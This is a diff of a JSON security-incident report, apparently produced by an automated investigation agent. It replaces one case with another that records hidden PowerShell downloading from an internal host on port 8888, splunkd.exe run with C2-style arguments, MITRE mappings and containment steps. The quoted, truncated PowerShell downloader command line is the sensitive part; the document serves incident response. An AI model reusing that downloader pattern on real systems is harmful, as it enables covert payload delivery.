@@ -1,55 +1,56 @@
 {
-  "incident_id": "INC-53027",
+  "incident_id": "INC-53021",
   "severity": "High",
-  "confidence": "Medium",
+  "confidence": "High",
   "execution_trace": [
     {
       "step_id": "step_1",
       "instruction": "Identify 1. username 2. IP address 3. Login Details 4. Computer name 5. Operating System",
-      "status": "NOT_MET",
-      "findings": "The source IP is identified as 192.168.10.210, and one alert also associates the host name BETHANYCHUCHU with this activity. No username, login details, or operating system are provided in the timeline, so the full identity and endpoint profile cannot be confirmed."
+      "status": "MET",
+      "findings": "Identified user context as KELLYWANG\\Kelly Wang on host KELLYWANG. Observed source IP 192.168.10.204 and destination/internal target 192.168.10.202. The timeline does not include a discrete logon event or logon type, but the active user context is present in the NetWitness alerts. Operating system is Windows."
     },
     {
       "step_id": "step_2",
       "instruction": "Was it horizontal or vertical",
       "status": "NOT_MET",
-      "findings": "The evidence shows outbound traffic from internal host 192.168.10.210 to external IP 188.40.170.197. There is no internal peer target, remote logon evidence, SMB/service activity, or privilege-use telemetry to support either horizontal or vertical movement."
+      "findings": "The telemetry shows internal-to-internal communication from 192.168.10.204 to 192.168.10.202, but there is insufficient evidence to classify the movement as horizontal or vertical. No corroborating remote logon, service creation, or explicit lateral-movement artifact is provided in the timeline."
     },
     {
       "step_id": "step_3",
       "instruction": "Was any malicious process spawned on the victim's machine?",
-      "status": "NOT_MET",
-      "findings": "No process creation telemetry is present. The timeline does not include Sysmon Event ID 1, Security Event ID 4688, EDR process lineage, process names, parent-child relationships, or command lines, so malicious process spawning cannot be confirmed."
+      "status": "MET",
+      "findings": "Yes. The endpoint executed powershell.exe with -WindowStyle Hidden and -ExecutionPolicy Bypass running a download command against http://192.168.10.202:8888/file/download. The timeline also shows splunkd.exe launched with suspicious arguments '-server http://192.168.10.202:8888 -group red'."
     },
     {
       "step_id": "step_4",
       "instruction": "Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration.",
-      "status": "NOT_MET",
-      "findings": "A process-tree analysis cannot be completed because no endpoint execution chain is available. The record contains no service creation, scheduled task creation, credential-use events, or file-staging evidence to prove privilege escalation, lateral movement, or exfiltration."
+      "status": "MET",
+      "findings": "The process activity is strongly suspicious and consistent with malicious tradecraft. Hidden PowerShell used WebClient download behavior to contact 192.168.10.202:8888, and repeated NetWitness alerts flagged Potential C2 Connection to acmecorp-reset.com with source 192.168.10.204 and destination 192.168.10.202. The splunkd.exe execution from Public with custom arguments suggests abuse of a legitimate binary for command-and-control or staging. No confirmed privilege escalation or data exfiltration is explicitly shown, but repeated C2 activity and tool-transfer behavior are present."
     },
     {
       "step_id": "step_5",
       "instruction": "Based on the analysis, determine if further investigation is necessary and the containment steps",
       "status": "MET",
-      "findings": "Further investigation is required. The incident remains suspicious outbound network activity with a high-risk alert and an external destination (188.40.170.197), but endpoint, authentication, and process telemetry are missing. Containment should focus on isolating the host, preserving volatile evidence, and blocking/monitoring the suspicious destination while collecting corroborating logs."
+      "findings": "Further investigation and immediate containment are warranted. Recommended actions include isolating host KELLYWANG/192.168.10.204, blocking 192.168.10.202 and acmecorp-reset.com at network controls, terminating the suspicious PowerShell and splunkd processes, preserving volatile evidence, and collecting endpoint telemetry and command-line history. Credential validation/reset for KELLYWANG\\Kelly Wang should be performed if compromise is confirmed."
     }
   ],
-  "incident_summary": "At 2026-04-28T10:08:54.761Z, the first alert for incident INC-53027 identified outbound activity from internal host 192.168.10.210 toward external IP 188.40.170.197, later summarized as suspicious outbound network activity with a Command and Control tactic label. The alert data did not include any decoded PowerShell, file hash, or process telemetry, and VirusTotal enrichment for 188.40.170.197 reported 9 malicious detections while AbuseIPDB returned no reports. A follow-up incident record at 2026-04-28T11:08:52+00:00 repeated the same source and destination relationship and associated the source host with the name BETHANYCHUCHU, but again showed no endpoint execution evidence, no command lines, and no file or payload artifacts. Across the timeline, the only observed behavior is network communication from 192.168.10.210 to 188.40.170.197; no user context, no authentication events, no parent/child process chain, and no privilege escalation artifacts were provided, so the activity remains limited to suspicious external network traffic rather than confirmed compromise or exfiltration.",
+  "incident_summary": "On 2025-12-01T07:33:35.204Z, the host KELLYWANG running under the user context KELLYWANG\\Kelly Wang generated the first of six NetWitness endpoint alerts for a Potential C2 Connection. The source was 192.168.10.204 and the target was 192.168.10.202, with the observed domain acmecorp-reset.com and a connection label tying the activity to KELLYWANG. The same pattern repeated at 07:33:35.299Z, 07:33:36.260Z, 07:33:36.262Z, and 07:33:36.268Z, all showing the same internal source and destination, the same user and host context, and the same domain association, indicating repeated command-and-control style communication in a very short interval. The alert set also captured suspicious endpoint execution on Windows: powershell.exe was run with -WindowStyle Hidden -ExecutionPolicy Bypass and a command that defined $server='http://192.168.10.202:8888', built a '/file/download' URL, created a System.Net.WebClient object, and added custom headers including platform='windows'. In parallel, splunkd.exe was executed with the command line 'splunkd.exe -server http://192.168.10.202:8888 -group red', which is inconsistent with normal Splunk daemon behavior on a workstation and aligns with suspicious tool abuse or staging activity. The telemetry shows internal network communication between 192.168.10.204 and 192.168.10.202:8888, repeated C2-style alerts, hidden PowerShell execution, and execution of a legitimate-looking binary with malicious-looking parameters, but it does not provide direct evidence of completed privilege escalation, lateral movement, or data exfiltration beyond the observed command-and-control and download behavior.",
   "actions_taken": [
-    "Reviewed the alert timeline and correlated repeated outbound network observations for source 192.168.10.210.",
-    "Compared enrichment results for destination IP 188.40.170.197 across VirusTotal, AbuseIPDB, and AlienVault OTX.",
-    "Checked the available telemetry for PowerShell, process creation, command-line, and file-hash indicators; none were present.",
-    "Assessed the incident against the privilege escalation playbook steps and marked unavailable evidence gaps.",
-    "Determined that additional endpoint and authentication telemetry is required before confirming compromise or movement type."
+    "Reviewed the six NetWitness sub-alerts associated with INC-53021.",
+    "Validated the active user context as KELLYWANG\\Kelly Wang and the host as KELLYWANG.",
+    "Correlated the repeated internal connection pattern to 192.168.10.202 and domain acmecorp-reset.com.",
+    "Identified suspicious powershell.exe execution with hidden window and ExecutionPolicy Bypass.",
+    "Identified suspicious splunkd.exe execution with custom server and group arguments.",
+    "Assessed need for containment and escalation based on repeated C2 indicators and downloader behavior."
   ],
   "recommended_containment": [
-    "Immediately isolate host 192.168.10.210 / BETHANYCHUCHU from the network using EDR network containment or switch port quarantine while preserving the endpoint state.",
-    "Block outbound connections to 188.40.170.197 at the perimeter firewall, proxy, and EDR network-control layer; retain the block long enough to confirm whether additional C2 IPs appear.",
-    "Collect volatile evidence from the host before remediation, including running processes, network connections, logged-on users, memory capture if supported, and active sockets.",
-    "Pull Windows Security, Sysmon, and EDR telemetry for 192.168.10.210 covering logon events, process creation, service installation, scheduled task creation, and outbound connection records around 2026-04-28T10:08:54Z.",
-    "Review authentication activity tied to the logged-on account(s) on 192.168.10.210 for unusual privileged logons, explicit credential use, or remote logon attempts.",
-    "Search enterprise proxy, DNS, and NetFlow logs for any additional destinations contacted by 192.168.10.210 during the same window and add confirmed suspicious IPs to temporary blocklists.",
-    "If the host cannot be isolated immediately, restrict its egress to only approved business destinations until endpoint telemetry confirms no active malicious process is present."
+    "Immediately isolate host KELLYWANG (192.168.10.204) from the network using EDR network containment while preserving local evidence.",
+    "Add an explicit temporary block at perimeter, proxy, and internal segmentation controls for destination 192.168.10.202 and the domain acmecorp-reset.com, including any resolved IPs and related URLs such as /file/download on port 8888.",
+    "Terminate the active powershell.exe process launched with -WindowStyle Hidden -ExecutionPolicy Bypass and the suspicious splunkd.exe instance running with '-server http://192.168.10.202:8888 -group red'.",
+    "Acquire volatile artifacts from KELLYWANG before reimaging or cleanup, including memory capture, process tree, command-line history, network connections, and Prefetch/Amcache/Shimcache where available.",
+    "Search enterprise EDR, DNS, proxy, and firewall telemetry for any additional hosts communicating with 192.168.10.202 or acmecorp-reset.com and quarantine any systems showing the same pattern.",
+    "Reset and review credentials for KELLYWANG\\Kelly Wang if there is any evidence of credential exposure, and invalidate active sessions/tokens associated with the account.",
+    "Hunt for the downloaded payload referenced by the WebClient '/file/download' request and remove any persistence, scheduled tasks, services, or startup artifacts associated with it."
   ],
   "business_impact_checklist": {
     "critical_system": "unknown",
@@ -57,78 +58,106 @@
     "data_sensitivity": "unknown",
     "operational_impact": "unknown"
   },
-  "severity_justification": "High is appropriate because the incident shows suspicious outbound communication from an internal host to a VirusTotal-malicious external IP, with repeated alerting and a Command and Control label. However, there is no confirmed malware execution, no privilege misuse evidence, no data exposure, and no demonstrated service outage or multi-system impact, so Critical is not justified.",
-  "confidence_justification": "Confidence is Medium because multiple timeline entries and threat-intelligence enrichments consistently support the same suspicious outbound-connection narrative, but key endpoint evidence is missing. The record lacks usernames, process trees, command lines, and authentication telemetry, so the conclusion is supported but incomplete.",
+  "severity_justification": "High severity is appropriate because the case contains strong indicators of active malicious activity on an important internal endpoint: hidden PowerShell execution with ExecutionPolicy Bypass, suspicious use of splunkd.exe, repeated internal command-and-control alerts, and a likely downloader contacting 192.168.10.202:8888 and acmecorp-reset.com. The evidence supports suspected compromise and possible tool staging/C2, but there is no confirmed ransomware, widespread outage, data exfiltration, or verified critical-system impact to justify Critical.",
+  "confidence_justification": "Confidence is High because multiple aligned sources support the conclusion: NetWitness sub-alerts repeated the same C2 pattern, the command lines are explicit, the host/user context is consistent, and threat intelligence elevated the file hashes with malicious detections. Evidence is sufficient and internally consistent, with only limited uncertainty around the exact privilege-escalation outcome and whether lateral movement occurred.",
   "mitre_mappings": [
     {
-      "timeline_phase": "Initial outbound network contact from internal host",
-      "observed_evidence": "Host 192.168.10.210 generated outbound traffic to external IP 188.40.170.197; incident label was suspicious outbound network activity / Command and Control; no PowerShell or process evidence was present.",
+      "timeline_phase": "Initial user/host activity and process launch",
+      "observed_evidence": "Host KELLYWANG under user KELLYWANG\\Kelly Wang on 192.168.10.204 begins suspicious activity tied to NetWitness case INC-53021.",
+      "tactic": "Execution",
+      "technique_name": "Command and Scripting Interpreter",
+      "technique_id": "T1059"
+    },
+    {
+      "timeline_phase": "Hidden PowerShell downloader execution",
+      "observed_evidence": "powershell.exe executed with '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server=\\'http://192.168.10.202:8888\\'; $url=$server + \\'/file/download\\'; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\\'platform\\',\\'windows\\'); ...\"'",
+      "tactic": "Defense Evasion",
+      "technique_name": "PowerShell",
+      "technique_id": "T1059.001"
+    },
+    {
+      "timeline_phase": "Downloader and remote retrieval over internal C2 endpoint",
+      "observed_evidence": "PowerShell WebClient connects to http://192.168.10.202:8888/file/download with custom headers and retrieves content from internal IP 192.168.10.202.",
+      "tactic": "Command and Control",
+      "technique_name": "Ingress Tool Transfer",
+      "technique_id": "T1105"
+    },
+    {
+      "timeline_phase": "Abuse of a legitimate-looking binary for suspicious network staging",
+      "observed_evidence": "splunkd.exe executed with command line 'splunkd.exe -server http://192.168.10.202:8888 -group red' from the KELLYWANG host.",
+      "tactic": "Persistence",
+      "technique_name": "System Services",
+      "technique_id": "T1543"
+    },
+    {
+      "timeline_phase": "Repeated internal beaconing / C2 alerts",
+      "observed_evidence": "Six NetWitness alerts flagged 'Potential C2 Connection (Kelly)' from 192.168.10.204 to 192.168.10.202, all associated with domain acmecorp-reset.com within seconds.",
       "tactic": "Command and Control",
       "technique_name": "Application Layer Protocol",
       "technique_id": "T1071"
     },
     {
-      "timeline_phase": "Repeated suspicious external communication with malicious reputation indicator",
-      "observed_evidence": "Repeated alerting for source 192.168.10.210 to destination 188.40.170.197; VirusTotal reported 9 malicious detections for 188.40.170.197; no internal target or execution telemetry was available.",
-      "tactic": "Command and Control",
-      "technique_name": "External Remote Services",
-      "technique_id": "T1133"
+      "timeline_phase": "Potential use of trusted process or masqueraded tooling to conceal malicious activity",
+      "observed_evidence": "Repeated C2-style activity and unusual splunkd.exe usage on Windows endpoint KELLYWANG suggest masquerading or abuse of a legitimate utility.",
+      "tactic": "Defense Evasion",
+      "technique_name": "Masquerading",
+      "technique_id": "T1036"
     }
   ],
-  "mitre_attack_table": "| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |\n| --- | --- | --- | --- | --- |\n| Initial outbound network contact from internal host | Host 192.168.10.210 generated outbound traffic to external IP 188.40.170.197; incident label was suspicious outbound network activity / Command and Control; no PowerShell or process evidence was present. | Command and Control | Application Layer Protocol | T1071 |\n| Repeated suspicious external communication with malicious reputation indicator | Repeated alerting for source 192.168.10.210 to destination 188.40.170.197; VirusTotal reported 9 malicious detections for 188.40.170.197; no internal target or execution telemetry was available. | Command and Control | External Remote Services | T1133 |",
+  "mitre_attack_table": "| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |\n| --- | --- | --- | --- | --- |\n| Initial user/host activity and process launch | Host KELLYWANG under user KELLYWANG\\Kelly Wang on 192.168.10.204 begins suspicious activity tied to NetWitness case INC-53021. | Execution | Command and Scripting Interpreter | T1059 |\n| Hidden PowerShell downloader execution | powershell.exe executed with '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server=\\'http://192.168.10.202:8888\\'; $url=$server + \\'/file/download\\'; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\\'platform\\',\\'windows\\'); ...\"' | Defense Evasion | PowerShell | T1059.001 |\n| Downloader and remote retrieval over internal C2 endpoint | PowerShell WebClient connects to http://192.168.10.202:8888/file/download with custom headers and retrieves content from internal IP 192.168.10.202. | Command and Control | Ingress Tool Transfer | T1105 |\n| Abuse of a legitimate-looking binary for suspicious network staging | splunkd.exe executed with command line 'splunkd.exe -server http://192.168.10.202:8888 -group red' from the KELLYWANG host. | Persistence | System Services | T1543 |\n| Repeated internal beaconing / C2 alerts | Six NetWitness alerts flagged 'Potential C2 Connection (Kelly)' from 192.168.10.204 to 192.168.10.202, all associated with domain acmecorp-reset.com within seconds. | Command and Control | Application Layer Protocol | T1071 |\n| Potential use of trusted process or masqueraded tooling to conceal malicious activity | Repeated C2-style activity and unusual splunkd.exe usage on Windows endpoint KELLYWANG suggest masquerading or abuse of a legitimate utility. | Defense Evasion | Masquerading | T1036 |",
   "policy_audit_logs": [
     {
-      "audit_id": "AUD-DP07-1791046823-1",
-      "incident_id": "INC-53027",
+      "audit_id": "AUD-DP07-1791302145-1",
+      "incident_id": "INC-53021",
       "agent_name": "Investigation Agent",
       "policy_reference": "Appendix C",
       "decision_point": "DP-07",
       "input_summary": "Critical System: False, Sensitive Data: False",
       "result": "Pass",
       "decision_made": "Investigate",
-      "timestamp": 1791046823.5956059,
+      "timestamp": 1791302145.2234557,
       "evidence_reference": "business_impact_checklist",
       "human_review_required": true,
       "final_reviewer": null
     },
     {
-      "audit_id": "AUD-DP08-1791046823-2",
-      "incident_id": "INC-53027",
+      "audit_id": "AUD-DP08-1791302145-2",
+      "incident_id": "INC-53021",
       "agent_name": "Investigation Agent",
       "policy_reference": "Appendix A",
       "decision_point": "DP-08",
       "input_summary": "Severity classification: High",
       "result": "Warning",
       "decision_made": "Escalate",
-      "timestamp": 1791046823.5956059,
+      "timestamp": 1791302145.2234557,
       "evidence_reference": "incident_summary",
       "human_review_required": true,
       "final_reviewer": null
     },
     {
-      "audit_id": "AUD-DP09-1791046823-3",
-      "incident_id": "INC-53027",
+      "audit_id": "AUD-DP09-1791302145-3",
+      "incident_id": "INC-53021",
       "agent_name": "Investigation Agent",
       "policy_reference": "Appendix F",
       "decision_point": "DP-09",
-      "input_summary": "Confidence level: Medium",
-      "result": "Warning",
-      "decision_made": "Escalate",
-      "timestamp": 1791046823.5956059,
+      "input_summary": "Confidence level: High",
+      "result": "Pass",
+      "decision_made": "Investigate",
+      "timestamp": 1791302145.2234557,
       "evidence_reference": "execution_trace",
       "human_review_required": true,
       "final_reviewer": null
     },
     {
-      "audit_id": "AUD-DP10-1791046823-4",
-      "incident_id": "INC-53027",
+      "audit_id": "AUD-DP10-1791302145-4",
+      "incident_id": "INC-53021",
       "agent_name": "Investigation Agent",
       "policy_reference": "Appendix G",
       "decision_point": "DP-10/DP-11",
-      "input_summary": "Severity: High, Confidence: Medium, Ransomware: False, Guest OS: False",
+      "input_summary": "Severity: High, Confidence: High, Ransomware: False, Guest OS: False",
       "result": "Fail",
       "decision_made": "Escalate",
-      "timestamp": 1791046823.5956059,
+      "timestamp": 1791302145.2234557,
       "evidence_reference": "recommended_containment",
       "human_review_required": true,
       "final_reviewer": null
